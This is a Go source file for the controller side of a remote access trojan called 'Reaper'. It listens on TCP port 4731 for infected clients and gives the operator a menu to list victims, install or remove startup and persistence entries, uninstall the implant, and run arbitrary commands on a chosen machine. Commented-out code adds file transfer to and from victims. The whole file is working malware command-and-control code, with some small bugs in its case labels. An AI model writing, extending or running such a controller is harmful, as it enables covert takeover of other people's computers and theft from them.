package internal

import (
	. "Kyberite/Reaper/control-src/util"
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall" //For Win32 API Calls
	"unsafe" //For Win32 API Calls
)

// CLI interface struct

type Reaper struct {
	listener net.Listener
	scanner  bufio.Scanner
	clients  List
}

func NewReaper() *Reaper {
	Reaper := &Reaper{}
	Reaper.clients = NewList()
	Reaper.scanner = *bufio.NewScanner(os.Stdin)
	return Reaper
}

func (Reaper *Reaper) Start() {
	clearScreen()
	for {
		if Reaper.listener == nil {
			var err error
			Reaper.listener, err = net.Listen("tcp", ":4731")
			if err != nil {
				Reaper.listener = nil
			} else {
				go Reaper.startListening()
			}
		} else {
				Reaper.handleCommands()
			}
		}
	}

func (Reaper *Reaper) startListening() {
	for {
		conn, err := Reaper.listener.Accept()
		if err != nil {
			break
		} else {
			Reaper.addConnections(conn)
		}
	}
}

func (Reaper *Reaper) stopListening() {
	Reaper.listener.Close()
	Reaper.clients.Clear()
}

// TODO Handle different net.Listener errors differently.
func (Reaper *Reaper) handleListenerError(err error) {
	//if err ==  {
	//
	//}
}

func (Reaper *Reaper) handleCommands() {
	for {
		printMenu()
		input := Reaper.getInput()
		inArray := strings.Split(input, " ")
		clearScreen()
		switch inArray[0] {
		case "1":
			Reaper.pingClient()
		case "2":
			if len(inArray) >= 2 {
				index, err := strconv.Atoi(inArray[1])
				if err != nil {
					Reaper.simplePacket(-1, "UNINSTALL")
				} else {
					Reaper.simplePacket(index, "UNINSTALL")
				}
			} else {
				Reaper.simplePacket(-1, "UNINSTALL")
			}
		case "3":
			if len(inArray) >= 2 {
				index, err := strconv.Atoi(inArray[1])
				if err != nil {
					Reaper.simplePacket(-1, "STARTUP")
				} else {
					Reaper.simplePacket(index, "STARTUP")
				}
			} else {
				Reaper.simplePacket(-1, "STARTUP")
			}
		case "4":
			if len(inArray) >= 2 {
				index, err := strconv.Atoi(inArray[1])
				if err != nil {
					Reaper.simplePacket(-1, "RMSTARTUP")
				} else {
					Reaper.simplePacket(index, "RMSTARTUP")
				}
			} else {
				Reaper.simplePacket(-1, "RMSTARTUP")
			}
		case "5":
			if len(inArray) >= 2 {
				index, err := strconv.Atoi(inArray[1])
				if err != nil {
					Reaper.simplePacket(-1, "PERSISTENCE")
				} else {
					Reaper.simplePacket(index, "PERSISTENCE")
				}
			} else {
				Reaper.simplePacket(-1, "PERSISTENCE")
			}
		case "6":
			if len(inArray) >= 2 {
				index, err := strconv.Atoi(inArray[1])
				if err != nil {
					Reaper.simplePacket(-1, "RMPERSISTENCE")
				} else {
					Reaper.simplePacket(index, "RMPERSISTENCE")
				}
			} else {
				Reaper.simplePacket(-1, "RMPERSISTENCE")
			}
		case "7":
			Reaper.commandExec()
		case "99":
			clearScreen()
			os.Exit(0)
		default:
			invalidCommand()
			Reaper.getInput()
		}
		clearScreen()
	}
}

func (Reaper *Reaper) handlePackets() {
	fmt.Println("WAITING FOR PACKET")
	packet := Packet{}
	for _, client := range Reaper.clients.All() {
		dec := client.GetDecoder()
		err := dec.Decode(&packet)
		if err == nil{
			fmt.Println(packet.GetForm(), packet.GetStringData())
			return
		} else {
			fmt.Println(err)
		}
	}
}

func (Reaper *Reaper) addConnections(conn net.Conn) {
	Reaper.clients.Add(conn)
}

func (Reaper *Reaper) removeConnection(conn net.Conn) {
	Reaper.clients.Remove(conn)
}

// Util Functions

func (Reaper *Reaper) getInput() string {
	Reaper.scanner.Scan()
	cmd := Reaper.scanner.Text()
	cmd = strings.Trim(cmd, "\n")
	return cmd
}

func clearScreen() {
	cmd := exec.Command("cmd", "/c", "cls")
	cmd.Stdout = os.Stdout
	cmd.Run()
}

// Commands

func (Reaper *Reaper) pingClient() {
	for _, client := range Reaper.clients.All() {
		enc := client.GetEncoder()
		err := enc.Encode(Packet{"PING", "", 0, nil, false})
		if err != nil {
			Reaper.removeConnection(client.GetConn())
			fmt.Println(err)
		}
	}
	printLogo()
	var i int
	for index, client := range Reaper.clients.All() {
		ip := client.GetConn().RemoteAddr().String()
		ip = strings.Split(ip, ":")[0]
		str := "| " + strconv.Itoa(index) + " | " + ip
		for i = 0; i < 27; i++ {
			if i == 0 || i == 4 || i == 26 {
				fmt.Print("+")
			} else {
				fmt.Print("-")
			}
		}
		fmt.Println()
		fmt.Print(str)
		for i := len(str); i < 26; i++ {
			fmt.Print(" ")
		}
		fmt.Println("|")
	}
	if i != 0 {
		fmt.Println("+---+---------------------+")
	} else {
		fmt.Println("+-------------------------+")
	}
	fmt.Println("| Press Enter To Continue |")
	fmt.Println("+-------------------------+")
	Reaper.getInput()
}


func (Reaper *Reaper) commandExec() {

	//Enter CMD 
	fmt.Println("Enter Command")
	command := Reaper.getInput()

	// Select Client (IP)
	var i int
	for index, client := range Reaper.clients.All() {
		ip := client.GetConn().RemoteAddr().String()
		ip = strings.Split(ip, ":")[0]
		str := "| " + strconv.Itoa(index) + " | " + ip
		for i = 0; i < 27; i++ {
			if i == 0 || i == 4 || i == 26 {
				fmt.Print("+")
			} else {
				fmt.Print("-")
			}
		}
		fmt.Println()
		fmt.Print(str)
		for i := len(str); i < 26; i++ {
			fmt.Print(" ")
		}
		fmt.Println("|")
	}
	if i != 0 {
		fmt.Println("+---+---------------------+")
	} else {
		fmt.Println("+-------------------------+")
	}
	//Select Client from iterated list
	clientindex := Reaper.getInput()
	clientindex_int, err := strconv.Atoi(clientindex)
	if err != nil{
		//Handle Error
		fmt.Println(err)
		return
	}

	// Iterate over all clients and if the index matches, send command
	/*TODO 
		- Test with multiple clients
	*/
	for index, client := range Reaper.clients.All() {
		if clientindex_int == index {
			enc := client.GetEncoder()
			err := enc.Encode(Packet{"COMMANDEXEC", command, 0, nil, false})
			Reaper.handlePackets() 
			if err != nil {
				Reaper.removeConnection(client.GetConn())
				fmt.Println(err)
			}
		}
	}
}

func (Reaper *Reaper) simplePacket(index int, packet string) {
	if index != -1 && Reaper.clients.Get(index) != (Client{}) {
		if index == -99 {
			for _, client := range Reaper.clients.All() {
				if packet == "UNINSTALL" {
					Reaper.removeConnection(client.GetConn())
				}
				enc := client.GetEncoder()
				err := enc.Encode(Packet{packet, "", 0, nil, false})
				if err != nil {
					fmt.Println(err)
					Reaper.removeConnection(client.GetConn())
				}
			}
		} else {
			cl := Reaper.clients.Get(index)
			enc := cl.GetEncoder()
			err := enc.Encode(Packet{packet, "", 0, nil, false})
			if err != nil {
				fmt.Println(err)
				Reaper.removeConnection(cl.GetConn())
			}
		}
		printLogo()
		switch packet {
		case "STARTUP":
			fmt.Println("+-------------------------+")
			fmt.Println("|      Startup Added      |")
			fmt.Println("| Press Enter To Continue |")
			fmt.Println("+-------------------------+")
		case "RRMSTARTUP":
			fmt.Println("+-------------------------+")
			fmt.Println("|     Startup Removed     |")
			fmt.Println("| Press Enter To Continue |")
			fmt.Println("+-------------------------+")
		case "PERSISTENCE":
			fmt.Println("+-------------------------+")
			fmt.Println("|    Persistence Added    |")
			fmt.Println("| Press Enter To Continue |")
			fmt.Println("+-------------------------+")
		case "RMPERSISTENCE":
			fmt.Println("+-------------------------+")
			fmt.Println("|   Persistence Removed   |")
			fmt.Println("| Press Enter To Continue |")
			fmt.Println("+-------------------------+")
		case "UNINSTALLL":
			fmt.Println("+-------------------------+")
			fmt.Println("|   Connection Removed    |")
			fmt.Println("| Press Enter To Continue |")
			fmt.Println("+-------------------------+")
		}
		Reaper.getInput()
	} else {
		printLogo()
		fmt.Println("+-------------------------+")
		fmt.Println("|  Connection Not Found   |")
		fmt.Println("| Press Enter To Continue |")
		fmt.Println("+-------------------------+")
		Reaper.getInput()
	}
}

// Menu Layout

func invalidCommand() {
	printLogo()
	fmt.Println("+-------------------------+")
	fmt.Println("|     Invalid Command     |")
	fmt.Println("| Press Enter To Continue |")
	fmt.Println("+-------------------------+")
}

func printLogo() {
	fmt.Println("REAPER")
}

func printMenu() {
	printLogo()
	fmt.Println("+----------------+")
	fmt.Println("| Commands       |")
	fmt.Println("+----+-----------+")
	fmt.Println("| 1  | Ping      |")
	fmt.Println("| 2  | Uninstall |")
	fmt.Println("| 3  | Startup   |")
	fmt.Println("| 4  | Rm Strtup |")
	fmt.Println("| 5  | Persist   |")
	fmt.Println("| 6  | Rm Prsist |")
	fmt.Println("| 7  | Cmd Exec  |")
	fmt.Println("| 99 | Exit      |")
	fmt.Println("+----+-----------+")
	fmt.Print("\nEnter Command: ")
}

// OLD CODE

//	Reaper.workingDirectory, _ = filepath.Abs(filepath.Dir(os.Args[0]))
//	Reaper.downloadDirectory, err = filepath.Abs(Reaper.workingDirectory + "\\Downloads")

//func (Reaper *Reaper) uploadFile(conn net.Conn, fileName string) {
//	buffer := make([]byte, 1024)
//	file, _ := os.Open(fileName)
//	defer file.Close()
//
//	i := 0
//	for {
//		_, err := file.Read(buffer)
//		if err == io.EOF {
//			err = Reaper.encoders[conn].Encode(Packet{"FILE", fileName, 0, nil, true})
//			if err != nil {
//				Reaper.removeConnection(conn)
//				fmt.Println(err)
//			}
//			break
//		}
//		err = Reaper.encoders[conn].Encode(Packet{"FILE", fileName, int64(i), buffer, false})
//		if err != nil {
//			Reaper.removeConnection(conn)
//			fmt.Println(err)
//		}
//		i++
//	}
//}

//case "FILE":
//	if _, err := os.Stat(Reaper.downloadDirectory); os.IsNotExist(err) {
//		err := os.MkdirAll(Reaper.downloadDirectory, os.ModeDir)
//		if err != nil {
//			fmt.Println(err)
//		}
//	}
//	fileName := Reaper.downloadDirectory + "\\" + packet.StringData
//	if packet.Done && files[fileName] != nil {
//		files[fileName].Close()
//		fmt.Println("Reaper: Finished downloading", packet.StringData)
//		delete(files, fileName)
//	} else if packet.Done && files[fileName] == nil {
//		continue
//	} else {
//		if files[fileName] == nil {
//			fmt.Println("Reaper: Started downloading", packet.StringData)
//			if _, err := os.Stat(fileName); os.IsNotExist(err) {
//				files[fileName], _ = os.Create(fileName)
//			} else {
//				files[fileName], _ = os.Open(fileName)
//			}
//			defer files[fileName].Close()
//		}
//		files[fileName].WriteAt(packet.FileData, packet.BytePos*1024)
//	}
